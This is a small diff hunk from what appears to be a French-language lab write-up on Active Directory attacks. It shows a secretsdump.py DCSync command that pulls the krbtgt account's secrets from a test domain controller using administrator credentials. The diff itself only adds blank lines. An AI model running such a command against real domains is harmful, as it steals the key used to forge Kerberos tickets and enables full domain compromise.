@@ -17,7 +17,10 @@ KRBTGT. Ce compte est utilisé par le service Kerberos pour signer et chiffrer t
 les tickets (TGT).
 
 
+
 ```
 secretsdump.py LAB-TEST.LOCAL/Administrateur:***********@192.168.174.133 -just-dc-user krbtgt
 ```
+
+
 <img width="1614" height="347" alt="DCSync" src="https://github.com/user-attachments/assets/3fbd9e00-2b50-46e7-9c08-7eb609c37dfc" />
